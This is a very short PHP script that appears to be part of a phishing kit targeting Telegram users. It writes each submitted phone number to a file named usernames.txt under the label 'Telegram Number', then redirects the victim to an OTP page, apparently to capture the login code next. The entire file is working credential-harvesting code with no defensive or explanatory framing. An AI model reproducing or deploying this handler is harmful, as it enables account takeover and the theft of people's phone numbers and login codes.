<?php
file_put_contents("usernames.txt", "Telegram Number: " . $_POST['phone_number'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();
?>